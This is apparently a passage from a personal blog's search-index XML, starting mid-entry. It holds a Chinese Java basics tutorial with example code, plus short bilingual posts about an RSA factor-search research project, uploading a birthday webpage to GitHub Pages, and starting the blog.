title="3. 控制结构"></a>3. 控制结构</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if语句</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// 执行代码</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (anotherCondition) &#123;</span><br><span class="line">    <span class="comment">// 执行代码</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 执行代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//switch语句</span></span><br><span class="line"><span class="keyword">switch</span> (expression) &#123;</span><br><span class="line">    <span class="keyword">case</span> value1:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> value2:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//while循环</span></span><br><span class="line"><span class="keyword">while</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// 执行代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//do-while循环</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 执行代码</span></span><br><span class="line">&#125; <span class="keyword">while</span> (condition);</span><br></pre></td></tr></table></figure><h2 id="二、面向对象编程"><a href="#二、面向对象编程" class="headerlink" title="二、面向对象编程"></a>二、面向对象编程</h2><h3 id="1-类与对象"><a href="#1-类与对象" class="headerlink" title="1. 类与对象"></a>1. 类与对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 成员变量</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成员方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">introduce</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我叫&quot;</span> + name + <span class="string">&quot;，今年&quot;</span> + age + <span class="string">&quot;岁。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>, <span class="number">20</span>);</span><br><span class="line">person.introduce();</span><br></pre></td></tr></table></figure><h3 id="2-继承"><a href="#2-继承" class="headerlink" title="2. 继承"></a>2. 继承</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物在吃东西。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗在叫。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">dog.eat(); <span class="comment">// 继承自父类的方法</span></span><br><span class="line">dog.bark(); <span class="comment">// 子类自己的方法</span></span><br></pre></td></tr></table></figure><h3 id="3-多态"><a href="#3-多态" class="headerlink" title="3.多态"></a>3.多态</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类引用指向子类对象</span></span><br><span class="line"><span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">animal.eat(); <span class="comment">// 调用子类重写的方法（如果有的话）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法重写</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗在吃狗粮。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-接口"><a href="#4-接口" class="headerlink" title="4. 接口"></a>4. 接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗在跑。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、异常处理"><a href="#三、异常处理" class="headerlink" title="三、异常处理"></a>三、异常处理</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可能抛出异常的代码</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">10</span> / <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (ArithmeticException e) &#123;</span><br><span class="line">    <span class="comment">// 捕获并处理异常</span></span><br><span class="line">    System.out.println(<span class="string">&quot;发生算术异常：&quot;</span> + e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 无论是否发生异常都会执行的代码</span></span><br><span class="line">    System.out.println(<span class="string">&quot;finally 块执行。&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、集合框架"><a href="#四、集合框架" class="headerlink" title="四、集合框架"></a>四、集合框架</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ArrayList</span></span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;香蕉&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;橙子&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// HashSet</span></span><br><span class="line">HashSet&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">set.add(<span class="number">1</span>);</span><br><span class="line">set.add(<span class="number">2</span>);</span><br><span class="line">set.add(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// HashMap</span></span><br><span class="line">HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;张三&quot;</span>, <span class="number">20</span>);</span><br><span class="line">map.put(<span class="string">&quot;李四&quot;</span>, <span class="number">22</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> map.get(<span class="string">&quot;张三&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA_factor_search</title>
      <link href="/posts/22bff566.html"/>
      <url>/posts/22bff566.html</url>
      
        <content type="html"><![CDATA[<p>随手记录一下我在两个星期前接到的一个项目，一个跟RSA因数分解有关的项目</p><p>这个项目涉及一个专利，在这里就不展示它的具体内容了</p><p>这个项目的大致内容是，使用专利中提到的搜索办法，对给定一个RSA的公钥，找到它的一个因数</p><p>专利的发明人是来自3所学校的老师，其中主要的负责人是来自于汕头大学的一位教授。专利中提到的搜索办法是基于一个叫做“RSA因数密化的集合体搜索”的算法，其数学基础来源于这位王教授在rsa因子搜索中的研究，同时他发明了很多数学工具来达到他的目的。</p><p>我对这个项目感兴趣的点在于，它涉及到了数学和计算机科学的交叉领域，当然还有密码学的部分。最大的兴趣在于，它是一个非常有挑战性的项目，需要我熟练掌握python编程，同时学会不断地优化代码，以达到更好的效果。</p><p>目前程序的编写以及优化已经达到第三代版本，在等待王教授他们优化算法，以便对原来的程序进行改进。</p><hr><p>I’d like to record a project I received two weeks ago, which is related to RSA factorization.</p><p>The project involves a patent, whose specific content won’t be shown here.</p><p>The main task of the project is to use the search method mentioned in the patent to find a factor of a given RSA public key.</p><p>The patent is invented by teachers from three schools, with the main person in charge being a professor from Shantou University. The search method mentioned in the patent is based on an algorithm called “RSA factor - dense set search”, whose mathematical foundation comes from Professor Wang’s research on RSA factor search. He also invented many mathematical tools to achieve his goal.</p><p>What interests me about this project is that it involves the intersection of mathematics and computer science, as well as cryptography. The biggest interest lies in its challenging nature, which requires me to be proficient in Python programming and constantly optimize the code for better results.</p><p>Currently, the program writing and optimization have reached the third - generation version, and we are waiting for Professor Wang and his team to optimize the algorithm to improve the original program.</p>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My First Blog</title>
      <link href="/posts/8a2ade14.html"/>
      <url>/posts/8a2ade14.html</url>
      
        <content type="html"><![CDATA[<p>今天写我的第一篇博客。这几天我在忙着将自己本地电脑上的项目通过git上传到github</p><p>记录一下我搭建在github上的一个项目：生日祝福网站代码。这是一个在其他博主的网盘中复制来的，经过我的修改，更符合我的审美。</p><p>这原先是为我的一个朋友设计的网页，并没有搭载在服务器上，现在借用github pages功能，使其能够通过链接访问。</p><p>这是主页的效果：</p><p><img src="/img/My_First_Blog.png" alt="picture"></p><p>项目链接：<a href="https://github.com/Aurorp1g/Happy_Birthday">Happy_Birthday</a></p><hr><p>Today, I wrote my first blog post. These days, I have been busy uploading my local projects to GitHub via Git.</p><p>I would like to document a project I set up on GitHub: the code for a birthday blessing website. This project was copied from another blogger’s cloud storage and has been modified by me to better suit my aesthetic preferences.</p><p>Originally, this webpage was designed for a friend of mine and was not hosted on a server. Now, by leveraging the GitHub Pages feature, it can be accessed via a link.</p><p>Here is the effect of the homepage:</p><p><img src="/img/My_First_Blog.png" alt="picture"></p><p>The link to the project: <a href="https://github.com/Aurorp1g/Happy_Birthday">Happy_Birthday</a></p>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>随着自己对计算机学习的深入，枯燥乏味的气息弥漫了我的学习生活。</p><p>为了打破这种局面，我决定创建一个博客来记录我的计算机学习历程。</p><p>我开始学习计算机是在高中时期，但当时并没有深入学习，在了解了一些计算机基础原理和掌握了一些编程知识后，就没能继续深入学习了。</p><p>所以，现在既是新手又是老手的我，有很大的学习空间和潜力，加油吧！！</p><hr><p>As I delve deeper into computer science, boredom has begun to permeate my learning experience.</p><p>To combat this, I’ve decided to create a blog to document my computer - learning journey.</p><p>I started learning about computers in high school, but I didn’t study them in depth. After grasping some basic principles and acquiring certain programming skills, I failed to continue my in - depth learning.</p><p>Therefore, I’m now both a novice and an experienced learner with vast room for growth and great potential. Let’s go!!</p>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
